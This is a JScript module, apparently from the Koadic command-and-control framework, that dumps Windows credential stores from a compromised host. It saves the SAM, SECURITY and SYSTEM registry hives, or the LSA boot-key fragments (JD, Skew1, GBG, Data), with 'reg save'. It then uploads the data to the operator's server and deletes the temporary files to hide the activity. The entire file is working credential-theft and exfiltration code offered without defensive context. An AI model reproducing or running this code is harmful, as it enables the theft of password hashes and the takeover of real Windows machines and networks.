function GetSysKey()
{
    var jdpath = Koadic.file.getPath("~RPATH~\\42JD");
    var skew1path = Koadic.file.getPath("~RPATH~\\42Skew1");
    var gbgpath = Koadic.file.getPath("~RPATH~\\42GBG");
    var datapath = Koadic.file.getPath("~RPATH~\\42Data");

    Koadic.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD" + " " + jdpath + " /y", false);
    Koadic.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1" + " " + skew1path + " /y", false);
    Koadic.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG" + " " + gbgpath + " /y", false);
    Koadic.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data" + " " + datapath + " /y", false);

    var data = Koadic.file.readBinary(jdpath);
    data += "~~~"+Koadic.file.readBinary(skew1path);
    data += "~~~"+Koadic.file.readBinary(gbgpath);
    data += "~~~"+Koadic.file.readBinary(datapath);

    var headers = {};
    headers["Task"] = "SysKey";

    if (Koadic.user.encoder != "936")
    {
        data = data.replace(/\\/g, "\\\\");
        data = data.replace(/\0/g, "\\0");
    }

    try
    {
        headers["encoder"] = Koadic.user.encoder();
    }
    catch (e)
    {
        headers["encoder"] = "1252";
    }

    Koadic.work.report(data, headers);
    Koadic.file.deleteFile(jdpath);
    Koadic.file.deleteFile(skew1path);
    Koadic.file.deleteFile(gbgpath);
    Koadic.file.deleteFile(datapath);
}

function DumpHive(name, uuid)
{
    var path = Koadic.file.getPath("~RPATH~\\" + uuid);

    Koadic.shell.run("reg save HKLM\\" + name + " " + path + " /y", false);

    Koadic.http.upload(path, name, ~CERTUTIL~, "Task");
    Koadic.file.deleteFile(path);
}

try
{
    DumpHive("SAM", "42SAM");
    DumpHive("SECURITY", "42SECURITY");
    if (~GETSYSHIVE~)
    {
        DumpHive("SYSTEM", "42SYSTEM");
    }
    else
    {
        GetSysKey();
    }

    Koadic.work.report("Complete");
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
